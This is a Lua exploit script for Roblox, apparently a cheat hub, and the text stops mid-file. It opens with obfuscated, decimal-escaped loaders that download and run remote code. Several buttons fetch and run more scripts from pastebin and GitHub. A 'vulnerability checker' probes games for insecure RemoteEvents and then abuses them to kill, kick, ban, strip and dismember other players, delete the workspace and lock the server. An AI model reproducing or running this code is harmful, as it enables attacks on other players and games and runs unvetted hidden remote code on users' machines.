-- load using loadstring loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\84\111\117\115\101\101\102\88\47\84\111\117\115\101\101\102\88\47\109\97\105\110\47\82\111\98\108\111\120\72\97\99\107\115\47\77\111\114\101\84\111\117\115\101\101\102\88\72\117\98\46\108\117\97\34\44\116\114\117\101\41\41\40\41")()
-- decompile the loadstring if you want to

print("Creating Frames And GUI")
-- fetching place holder https://assetdelivery.roblox.com/v1/asset/?ID=
-- decomplier script will be here as i get a new pc

local NotifyModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/PeaPattern/notif-lib/main/main.lua"))()
local MainGUI = Instance.new("ScreenGui")
local Open = Instance.new("Frame")
local Open_2 = Instance.new("TextButton")
local Main_2 = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local FeNoobAll = Instance.new("TextButton")
local FeAnimR6 = Instance.new("TextButton")
local FeChatB = Instance.new("TextButton")
local FeTelekineses = Instance.new("TextButton")
local FB = Instance.new("TextButton")
local FeGamepass = Instance.new("TextButton")
local Close = Instance.new("TextButton")

print("Created")
print("Loading Frames,GUI")

MainGUI.Name = "MainGUI"
MainGUI.Parent = game.CoreGui
-- add more functions and male executor powerful enough
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\115\99\114\105\112\116\115\46\110\101\116\47\114\97\119\47\85\110\105\118\101\114\115\97\108\45\83\99\114\105\112\116\45\70\101\45\98\121\112\97\115\115\45\51\53\48\54\54"))()

Open.Name = "Open"
Open.Parent = MainGUI
Open.AnchorPoint = Vector2.new(0, 1)
Open.Size = UDim2.new(0, 100, 0, 24)
Open.BorderColor3 = Color3.fromRGB(0, 0, 0)
Open.Position = UDim2.new(0, 0, 1, 0)
Open.BorderSizePixel = 0
Open.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Open_2.Name = "Open"
Open_2.Parent = Open
Open_2.Size = UDim2.new(0, 96, 0, 23)
Open_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Open_2.Position = UDim2.new(0.0199999996, 0, 0.0416666679, 0)
Open_2.BorderSizePixel = 0
Open_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Open_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Open_2.Text = "Open Hub"
Open_2.TextSize = 14
Open_2.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Open_2.Visible = true
Open_2.MouseButton1Down:Connect(function()
	Main_2.Visible = true
	Open.Visible = false
    NotifyModule:Notify("Opened!", 2)
end)

print("Open Frame Loaded")

Main_2.Name = "Main"
Main_2.Parent = MainGUI
Main_2.Size = UDim2.new(0, 456, 0, 222)
Main_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main_2.Position = UDim2.new(0.315278888, 0, 0.32159999, 0)
Main_2.BorderSizePixel = 0
Main_2.BackgroundColor3 = Color3.fromRGB(107, 107, 107)
Main_2.Visible = false

TextLabel.Name = "TextLabel"
TextLabel.Parent = Main_2
TextLabel.Size = UDim2.new(0, 456, 0, 13)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.BackgroundColor3 = Color3.fromRGB(141, 141, 141)
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Text = "TouseefX's Hub Reborn [Testing]"
TextLabel.TextSize = 14
TextLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)

ScrollingFrame.Name = "ScrollingFrame"
ScrollingFrame.Parent = Main_2
ScrollingFrame.Active = true
ScrollingFrame.Size = UDim2.new(0, 456, 0, 209)
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.Position = UDim2.new(0, 0, 0.0585585572, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(141, 141, 141)
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)

FeNoobAll.Name = "Steve"
FeNoobAll.Parent = ScrollingFrame
FeNoobAll.Size = UDim2.new(0, 137, 0, 23)
FeNoobAll.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeNoobAll.Position = UDim2.new(0.0504385978, 0, 0.0440616868, 0)
FeNoobAll.BorderSizePixel = 0
FeNoobAll.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeNoobAll.TextColor3 = Color3.fromRGB(0, 0, 0)
FeNoobAll.Text = "Steve"
FeNoobAll.TextSize = 14
FeNoobAll.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeNoobAll.MouseButton1Down:Connect(function()
	NotifyModule:Notify("does not work on some games", 5)
	loadstring(game:HttpGet(('https://pastebin.com/raw/2NNDTLjL'),true))()
end)

FeAnimR6.Name = "Fe Admin"
FeAnimR6.Parent = ScrollingFrame
FeAnimR6.Size = UDim2.new(0, 137, 0, 23)
FeAnimR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeAnimR6.Position = UDim2.new(0.350877196, 0, 0.0448816456, 0)
FeAnimR6.BorderSizePixel = 0
FeAnimR6.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeAnimR6.TextColor3 = Color3.fromRGB(0, 0, 0)
FeAnimR6.Text = "Fe Admin"
FeAnimR6.TextSize = 14
FeAnimR6.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeAnimR6.MouseButton1Down:Connect(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/Source.lua", true))()
end)
	
FeChatB.Name = "FeChatB"
FeChatB.Parent = ScrollingFrame
FeChatB.Size = UDim2.new(0, 137, 0, 23)
FeChatB.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeChatB.Position = UDim2.new(0.0504385978, 0, 0.0932036042, 0)
FeChatB.BorderSizePixel = 0
FeChatB.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeChatB.TextColor3 = Color3.fromRGB(0, 0, 0)
FeChatB.Text = "Fe Chat Bypass"
FeChatB.TextSize = 14
FeChatB.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeChatB.MouseButton1Down:Connect(function()
     print("noscript")
end)

FeTelekineses.Name = "UndetectedRemoteSpy"
FeTelekineses.Parent = ScrollingFrame
FeTelekineses.Size = UDim2.new(0, 137, 0, 23)
FeTelekineses.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeTelekineses.Position = UDim2.new(0.651315808, 0, 0.0445480719, 0)
FeTelekineses.BorderSizePixel = 0
FeTelekineses.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeTelekineses.TextColor3 = Color3.fromRGB(0, 0, 0)
FeTelekineses.Text = "UndetectedRemoteSpy"
FeTelekineses.TextSize = 14
FeTelekineses.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeTelekineses.MouseButton1Down:Connect(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Octo-Spy/refs/heads/main/Main.lua", true))()
     NotifyModule:Notify("made by @cherry_peashooter on discord Rewrite Soon", 5)
end)

FB.Name = "FB"
FB.Parent = ScrollingFrame
FB.Size = UDim2.new(0, 137, 0, 23)
FB.BorderColor3 = Color3.fromRGB(0, 0, 0)
FB.Position = UDim2.new(0.350877196, 0, 0.0919114947, 0)
FB.BorderSizePixel = 0
FB.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FB.TextColor3 = Color3.fromRGB(0, 0, 0)
FB.Text = "Fe Bypass (Cars Games And More)"
FB.TextSize = 14
FB.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FB.MouseButton1Down:Connect(function()
    NotifyModule:Notify("This Script Has Private For Too Long", 2)
	local StarterGui = game:GetService("StarterGui")
	local showNotification = true

	function Notify(tl, t, d) 
		if showNotification == true then
			StarterGui:SetCore("SendNotification", {
				Title = tl;
				Text = t;
				Duration = d;
				Icon = "http://www.roblox.com/asset/?id=8388262491";
			})
		end
	end

	if game.CoreGui:FindFirstChild("destruct") then
		game.CoreGui.destruct:Destroy()
	end

	local BlurFX = Instance.new("BlurEffect")
	BlurFX.Size = 0
	BlurFX.Name = "Blur"
	BlurFX.Parent = workspace.CurrentCamera

	local function blurefct(siz)
		local TweenService = game:GetService("TweenService")
		local goal = {}
		goal.Size = siz

		local tweenInfo = TweenInfo.new(2)
		local tween = TweenService:Create(BlurFX, tweenInfo, goal)

		tween:Play()
	end

	local remote = "nil"
	local found = false
	local enable = false
	local sent = false
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

	local checkIn = {"Workspace", "ReplicatedStorage", "StarterGui", "CoreGui"}
	local names = {"Delete", "Deletar", "Remove", "Destroy", "Clean", "Clear","Bullet", "Bala", "Shoot", "Shot", "Fire", "Segway", "Handless", "Sword", "Attack"}
	if char then
		blurefct(20)
		Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
		for _, service in pairs(checkIn) do
			for i,v in pairs(game:GetService(service):GetDescendants()) do
				for _, str in pairs(names) do
					if string.match(v.Name, str) and v:IsA("RemoteEvent") then
						print("Checking " .. v.Name .. " from " .. service .. " service")
						local success, error = pcall(function()
							game:GetService("ReplicatedStorage")[v.Name]:FireServer(LocalPlayer.Character.Head)
							found = true
						end)
						if success then
							remote = game:GetService("ReplicatedStorage")[v.Name]
						end 
						wait(0.5)
						if not LocalPlayer.Character:FindFirstChild("Head") then
							enable = true
							sent = true
						end
					end
				end
			end
		end
	end

	if sent == false then
		Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
		blurefct(0)
	end

	function work(arg1)
		remote:FireServer(arg1)
	end

	function GetPlayer(String)
		local Found = {}
		local strl = String:lower()
		if strl == "all" then
			for i,v in pairs(game.Players:GetPlayers()) do
				table.insert(Found,v.Name)
			end
		elseif strl == "others" then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					table.insert(Found,v.Name)
				end
			end  
		elseif strl == "me" then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.Name == game.Players.LocalPlayer.Name then
					table.insert(Found,v.Name)
				end
			end  
		else
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.Name:lower():sub(1, #String) == String:lower() then
					table.insert(Found,v.Name)
				end
			end    
		end
		return Found    
	end
	if enable == true then
		blurefct(0)
		Notify("Destructed Hex", "Made by Luq and Luca", 10)
		local destruct = Instance.new("ScreenGui")
		local main = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		local line = Instance.new("Frame")
		local ImageLabel = Instance.new("ImageLabel")
		local scripts = Instance.new("ScrollingFrame")
		local UIGridLayout = Instance.new("UIGridLayout")
		local kill = Instance.new("TextButton")
		local kick = Instance.new("TextButton")
		local ban = Instance.new("TextButton")
		local unban = Instance.new("TextButton")
		local goto = Instance.new("TextButton")
		local view = Instance.new("TextButton")
		local unview = Instance.new("TextButton")
		local btools = Instance.new("TextButton")
		local nuke = Instance.new("TextButton")
		local naked = Instance.new("TextButton")
		local faceless = Instance.new("TextButton")
		local nolimbs = Instance.new("TextButton")
		local hatless = Instance.new("TextButton")
		local sink = Instance.new("TextButton")
		local rtools = Instance.new("TextButton")
		local stools = Instance.new("TextButton")
		local slock = Instance.new("TextButton")
		local player = Instance.new("TextBox")
		local ranims = Instance.new("TextButton")
		local ragdoll = Instance.new("TextButton")
		local shutdown = Instance.new("TextButton")
		local punish = Instance.new("TextButton")
		local rchassis = Instance.new("TextButton")

		--Properties:

		destruct.Name = "destruct"
		destruct.Parent = game.CoreGui
		destruct.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		main.Name = "main"
		main.Parent = destruct
		main.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
		main.BackgroundTransparency = 0.3
		main.BorderSizePixel = 0
		main.Position = UDim2.new(0.268847764, 0, 0.372854918, 0)
		main.Size = UDim2.new(0, 325, 0, 239)
		main.Active = true

		local UserInputService = game:GetService("UserInputService")

		local gui = main

		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.05, true)
		end

		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)

		TextLabel.Parent = main
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.BorderSizePixel = 0
		TextLabel.Position = UDim2.new(0.292307675, 0, 0, 0)
		TextLabel.Size = UDim2.new(0, 134, 0, 25)
		TextLabel.Font = Enum.Font.Roboto
		TextLabel.Text = "Destructed_Hex"
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextSize = 17.000

		line.Name = "line"
		line.Parent = main
		line.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
		line.BorderSizePixel = 0
		line.Position = UDim2.new(0, 0, 0.106986806, 0)
		line.Size = UDim2.new(0, 325, 0, 6)

		ImageLabel.Parent = main
		ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.BorderSizePixel = 0
		ImageLabel.Position = UDim2.new(0.184615389, 0, 0, 0)
		ImageLabel.Size = UDim2.new(0, 25, 0, 25)
		ImageLabel.Image = "http://www.roblox.com/asset/?id=8388262491"
		ImageLabel.ScaleType = Enum.ScaleType.Fit

		scripts.Name = "scripts"
		scripts.Parent = main
		scripts.Active = true
		scripts.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
		scripts.BackgroundTransparency = 1
		scripts.BorderSizePixel = 0
		scripts.Position = UDim2.new(0, 0, 0.134782612, 0)
		scripts.Size = UDim2.new(0, 325, 0, 173)
		scripts.CanvasSize = UDim2.new(0, 0, 1.150, 0)

		UIGridLayout.Parent = scripts
		UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIGridLayout.CellSize = UDim2.new(0, 100, 0, 30)

		kill.Name = "kill"
		kill.Parent = scripts
		kill.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		kill.BorderSizePixel = 0
		kill.Size = UDim2.new(0, 200, 0, 50)
		kill.Font = Enum.Font.Roboto
		kill.Text = "Kill"
		kill.TextColor3 = Color3.fromRGB(255, 255, 255)
		kill.TextSize = 14.000

		kick.Name = "kick"
		kick.Parent = scripts
		kick.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		kick.BorderSizePixel = 0
		kick.Size = UDim2.new(0, 200, 0, 50)
		kick.Font = Enum.Font.Roboto
		kick.Text = "Kick"
		kick.TextColor3 = Color3.fromRGB(255, 255, 255)
		kick.TextSize = 14.000

		ban.Name = "ban"
		ban.Parent = scripts
		ban.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		ban.BorderSizePixel = 0
		ban.Size = UDim2.new(0, 200, 0, 50)
		ban.Font = Enum.Font.Roboto
		ban.Text = "Ban"
		ban.TextColor3 = Color3.fromRGB(255, 255, 255)
		ban.TextSize = 14.000

		unban.Name = "unban"
		unban.Parent = scripts
		unban.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		unban.BorderSizePixel = 0
		unban.Size = UDim2.new(0, 200, 0, 50)
		unban.Font = Enum.Font.Roboto
		unban.Text = "UnBan"
		unban.TextColor3 = Color3.fromRGB(255, 255, 255)
		unban.TextSize = 14.000

		goto.Name = "goto"
		goto.Parent = scripts
		goto.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		goto.BorderSizePixel = 0
		goto.Size = UDim2.new(0, 200, 0, 50)
		goto.Font = Enum.Font.Roboto
		goto.Text = "Goto"
		goto.TextColor3 = Color3.fromRGB(255, 255, 255)
		goto.TextSize = 14.000

		view.Name = "view"
		view.Parent = scripts
		view.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		view.BorderSizePixel = 0
		view.Size = UDim2.new(0, 200, 0, 50)
		view.Font = Enum.Font.Roboto
		view.Text = "View"
		view.TextColor3 = Color3.fromRGB(255, 255, 255)
		view.TextSize = 14.000

		unview.Name = "unview"
		unview.Parent = scripts
		unview.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		unview.BorderSizePixel = 0
		unview.Size = UDim2.new(0, 200, 0, 50)
		unview.Font = Enum.Font.Roboto
		unview.Text = "UnView"
		unview.TextColor3 = Color3.fromRGB(255, 255, 255)
		unview.TextSize = 14.000

		btools.Name = "btools"
		btools.Parent = scripts
		btools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		btools.BorderSizePixel = 0
		btools.Size = UDim2.new(0, 200, 0, 50)
		btools.Font = Enum.Font.Roboto
		btools.Text = "BTools"
		btools.TextColor3 = Color3.fromRGB(255, 255, 255)
		btools.TextSize = 14.000

		nuke.Name = "nuke"
		nuke.Parent = scripts
		nuke.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		nuke.BorderSizePixel = 0
		nuke.Size = UDim2.new(0, 200, 0, 50)
		nuke.Font = Enum.Font.Roboto
		nuke.Text = "Nuke"
		nuke.TextColor3 = Color3.fromRGB(255, 255, 255)
		nuke.TextSize = 14.000

		naked.Name = "naked"
		naked.Parent = scripts
		naked.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		naked.BorderSizePixel = 0
		naked.Size = UDim2.new(0, 200, 0, 50)
		naked.Font = Enum.Font.Roboto
		naked.Text = "Naked"
		naked.TextColor3 = Color3.fromRGB(255, 255, 255)
		naked.TextSize = 14.000

		faceless.Name = "faceless"
		faceless.Parent = scripts
		faceless.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		faceless.BorderSizePixel = 0
		faceless.Size = UDim2.new(0, 200, 0, 50)
		faceless.Font = Enum.Font.Roboto
		faceless.Text = "Faceless"
		faceless.TextColor3 = Color3.fromRGB(255, 255, 255)
		faceless.TextSize = 14.000

		nolimbs.Name = "nolimbs"
		nolimbs.Parent = scripts
		nolimbs.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		nolimbs.BorderSizePixel = 0
		nolimbs.Size = UDim2.new(0, 200, 0, 50)
		nolimbs.Font = Enum.Font.Roboto
		nolimbs.Text = "NoLimbs"
		nolimbs.TextColor3 = Color3.fromRGB(255, 255, 255)
		nolimbs.TextSize = 14.000

		hatless.Name = "hatless"
		hatless.Parent = scripts
		hatless.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		hatless.BorderSizePixel = 0
		hatless.Size = UDim2.new(0, 200, 0, 50)
		hatless.Font = Enum.Font.Roboto
		hatless.Text = "Hatless"
		hatless.TextColor3 = Color3.fromRGB(255, 255, 255)
		hatless.TextSize = 14.000

		sink.Name = "sink"
		sink.Parent = scripts
		sink.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		sink.BorderSizePixel = 0
		sink.Size = UDim2.new(0, 200, 0, 50)
		sink.Font = Enum.Font.Roboto
		sink.Text = "Sink"
		sink.TextColor3 = Color3.fromRGB(255, 255, 255)
		sink.TextSize = 14.000

		rtools.Name = "rtools"
		rtools.Parent = scripts
		rtools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		rtools.BorderSizePixel = 0
		rtools.Size = UDim2.new(0, 200, 0, 50)
		rtools.Font = Enum.Font.Roboto
		rtools.Text = "Rtools"
		rtools.TextColor3 = Color3.fromRGB(255, 255, 255)
		rtools.TextSize = 14.000

		stools.Name = "stools"
		stools.Parent = scripts
		stools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		stools.BorderSizePixel = 0
		stools.Size = UDim2.new(0, 200, 0, 50)
		stools.Font = Enum.Font.Roboto
		stools.Text = "Stools"
		stools.TextColor3 = Color3.fromRGB(255, 255, 255)
		stools.TextSize = 14.000

		slock.Name = "slock"
		slock.Parent = scripts
		slock.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		slock.BorderSizePixel = 0
		slock.Size = UDim2.new(0, 200, 0, 50)
		slock.Font = Enum.Font.Roboto
		slock.Text = "Slock"
		slock.TextColor3 = Color3.fromRGB(255, 255, 255)
		slock.TextSize = 14.000

		player.Name = "player"
		player.Parent = main
		player.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
		player.BorderSizePixel = 0
		player.Position = UDim2.new(0.0246153846, 0, 0.870292902, 0)
		player.Size = UDim2.new(0, 310, 0, 23)
		player.ClearTextOnFocus = false
		player.Font = Enum.Font.SourceSans
		player.PlaceholderColor3 = Color3.fromRGB(152, 152, 152)
		player.PlaceholderText = "PLAYER"
		player.Text = ""
		player.TextColor3 = Color3.fromRGB(255, 255, 255)
		player.TextSize = 14.000

		ragdoll.Name = "ragdoll"
		ragdoll.Parent = scripts
		ragdoll.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		ragdoll.BorderSizePixel = 0
		ragdoll.Position = UDim2.new(0, 0, 0.898455501, 0)
		ragdoll.Size = UDim2.new(0, 100, 0, 24)
		ragdoll.Font = Enum.Font.SourceSans
		ragdoll.Text = "Ragdoll"
		ragdoll.TextColor3 = Color3.fromRGB(255, 255, 255)
		ragdoll.TextSize = 14.000

		ranims.Name = "ranims"
		ranims.Parent = scripts
		ranims.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		ranims.BorderSizePixel = 0
		ranims.Position = UDim2.new(0, 0, 0.898455501, 0)
		ranims.Size = UDim2.new(0, 100, 0, 24)
		ranims.Font = Enum.Font.SourceSans
		ranims.Text = "Ranim"
		ranims.TextColor3 = Color3.fromRGB(255, 255, 255)
		ranims.TextSize = 14.000

		shutdown.Name = "shutdown"
		shutdown.Parent = scripts
		shutdown.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		shutdown.BorderSizePixel = 0
		shutdown.Size = UDim2.new(0, 200, 0, 50)
		shutdown.Font = Enum.Font.Roboto
		shutdown.Text = "Shutdown"
		shutdown.TextColor3 = Color3.fromRGB(255, 255, 255)
		shutdown.TextSize = 14.000

		punish.Name = "punish"
		punish.Parent = scripts
		punish.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		punish.BorderSizePixel = 0
		punish.Size = UDim2.new(0, 200, 0, 50)
		punish.Font = Enum.Font.Roboto
		punish.Text = "Punish"
		punish.TextColor3 = Color3.fromRGB(255, 255, 255)
		punish.TextSize = 14.000

		rchassis.Name = "rchassis"
		rchassis.Parent = scripts
		rchassis.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		rchassis.BorderSizePixel = 0
		rchassis.Size = UDim2.new(0, 200, 0, 50)
		rchassis.Font = Enum.Font.Roboto
		rchassis.Text = "Rchassis"
		rchassis.TextColor3 = Color3.fromRGB(255, 255, 255)
		rchassis.TextSize = 14.000

		local bannedPlayers = {}
		local serverlock = false
		local sdown = false
		local cam = workspace.CurrentCamera

		function GetBannedPlayer(target)
			local Found = {}
			for _, str in pairs(bannedPlayers) do
				if str:find(target) then
					table.insert(Found, str)
					break
				end
			end
			return Found
		end

		game:GetService("Players").PlayerAdded:Connect(function(plr)
			for i,v in pairs(bannedPlayers) do
				if plr.Name == v then
					Notify("Banned User", plr.Name .. " Tried to join the game", 5)
					work(plr)
				end
			end
			if serverlock == true then
				Notify("Join Attempt", plr.Name .. " Tried to join the game but the server is locked", 5)
				work(plr)
			end
			if sdown == true then
				work(plr)
			end
		end)

		btools.MouseButton1Click:Connect(function()
			local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
			local Equipped = false

			Tool.RequiresHandle = false
			Tool.Name = "Destroy Tool"
			local Field = Instance.new("SelectionBox",game.Workspace)
			local Mouse = game.Players.LocalPlayer:GetMouse()
			Field.LineThickness = 0.1
			Tool.TextureId = "http://www.roblox.com/asset/?id=12223874"
			Tool.Equipped:Connect(function()
				Equipped = true

				while Equipped == true do
					if Mouse.Target ~= nil then
						Field.Adornee = Mouse.Target
						Mouse.Icon = "rbxasset://textures/HammerCursor.png"
					else
						Field.Adornee = nil
						Mouse.Icon = ""
					end
					wait()
				end
			end)


			Tool.Unequipped:Connect(function()
				Equipped = false
				Field.Adornee = nil
				Mouse.Icon = ""
			end)

			Tool.Activated:Connect(function()
				if Mouse.Target ~= nil then
					print(Mouse.Target)
					remote:FireServer(Mouse.Target, {Value = Mouse.Target})
					local ex = Instance.new'Explosion'
					ex.BlastRadius = 0
					ex.Position = Mouse.Target.Position
					ex.Parent = workspace

					local AttemptTarget = Mouse.Target
					while AttemptTarget ~= nil do
						AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
						AttemptTarget.CanCollide = false
						wait()
					end
				end
			end)
		end)

		kill.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
						work(game:GetService("Players")[v].Character.Torso.Neck)
					else
						work(game:GetService("Players")[v].Character.Head.Neck)
					end
				end)
			end
		end)

		naked.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				if game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt") then
					spawn(function()
						work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt"))
					end)
				end
				if game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants") then
					spawn(function()
						work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants"))
					end)
				end
				if game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic") then
					spawn(function()
						work(game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic"))
					end)
				end
			end
		end)

		ranims.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
					work(game:GetService("Players")[v].Character.Humanoid:FindFirstChild("Animator"))
				end
			end
		end)

		nolimbs.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
						names = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
						for _, str in pairs(names) do
							work(game:GetService("Players")[v].Character[str])
						end
					else
						names = {"LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg"}
						for _, str in pairs(names) do
							work(game:GetService("Players")[v].Character[str])
						end
					end
				end)
			end
		end)

		kick.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					work(game:GetService("Players")[v])
				end)
			end
		end)

		nuke.MouseButton1Click:Connect(function()
			for i,c in pairs(game.Workspace:GetChildren()) do
				all = c
				work(all)
			end
		end)

		ban.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					if not table.find(bannedPlayers, v.Name) then
						plr = game:GetService("Players")[v]
						table.insert(bannedPlayers, plr.Name)
						Notify("Banned", plr.Name .. " Will not be able to join the server", 5)
						work(plr)
					end
				end)
			end
		end)

		unban.MouseButton1Click:Connect(function()
			for i,v in pairs(GetBannedPlayer(player.Text)) do
				spawn(function()
					table.remove(bannedPlayers, table.find(bannedPlayers, v))
					Notify("UnBanned", v .." Is now able to join the server", 5)
				end)
			end
		end)

		goto.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
			end
		end)

		sink.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					destr = game:GetService("Players")[v].Character["HumanoidRootPart"]
					work(destr)
				end)
			end
		end)

		faceless.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					destructwashere = game:GetService("Players")[v].Character.Head.face
					work(destructwashere)
				end)
			end
		end)

		hatless.MouseButton1Click:Connect(function()
			for i, v in pairs(GetPlayer(player.Text)) do
				for i, h in pairs(game:GetService("Players")[v].Character:GetChildren()) do
					if h:IsA("Accessory") then
						work(h)
					end
				end
			end
		end)

		ragdoll.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					e = game:GetService("Players")[v].Character:FindFirstChild("Humanoid")
					work(e)
				end)
			end
		end)

		local toggle = false

		slock.MouseButton1Click:Connect(function()
			if toggle == false then
				slock.Text = "UnSlock"
				Notify("Server Locked", "Nobody can join the server", 5)
				serverlock = true
				toggle = true
			elseif toggle == true then
				slock.Text = "Slock"
				Notify("Server Unlocked", "Anyone can join the server", 5)
				serverlock = false
				toggle = false
			end
		end)

